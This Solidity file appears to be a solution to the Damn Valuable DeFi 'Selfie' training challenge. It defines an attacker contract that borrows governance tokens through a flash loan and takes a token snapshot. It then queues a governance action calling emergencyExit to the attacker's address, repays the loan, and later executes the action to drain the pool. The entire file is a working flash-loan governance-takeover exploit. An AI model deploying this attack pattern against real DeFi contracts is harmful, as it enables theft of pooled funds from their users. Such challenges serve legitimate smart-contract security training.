//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

interface ISimpleGovernance{
    function queueAction(
        address target, 
        uint128 value, 
        bytes calldata data
        ) external returns (uint256 actionId);

    function executeAction(
        uint256 actionId
        ) external  returns (bytes memory);
}

interface ISelfiePool{
    function flashLoan(
        IERC3156FlashBorrower _receiver,
        address _token,
        uint256 _amount,
        bytes calldata _data
    ) external  returns (bool);

}

contract AttackerSalfie is IERC3156FlashBorrower{
    ISelfiePool immutable pool;
    DamnValuableTokenSnapshot immutable token;
    ISimpleGovernance immutable governance;
    address immutable owner;
    bytes private data;
    uint256 actionId;
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    constructor(address _pool, address _token,address _governance){
        owner = msg.sender;
        pool = ISelfiePool(_pool);
        token = DamnValuableTokenSnapshot(_token);
        governance = ISimpleGovernance(_governance);
        data = abi.encodeWithSignature("emergencyExit(address)", owner);
    }

    function startAttack(uint256 amount) external{
        pool.flashLoan(this,address(token),amount,"");
    }

    function onFlashLoan(
        address _initiator,
        address _token,
        uint256 _amount,
        uint256 _fee,
        bytes calldata _data
    ) external returns (bytes32){
        require(_initiator == address(this), "This has not taken loan");
        require(address(_token) == address(token), "Invalid currency");
        require(_fee == 0, "Why fee");
        require(_data.length == 0, "Not mine");
        token.snapshot();
        actionId = governance.queueAction(address(pool), 0, data);
        token.approve(msg.sender, _amount);
        return CALLBACK_SUCCESS;
    }

    function finalAttack() external{
        governance.executeAction(actionId);
    }
}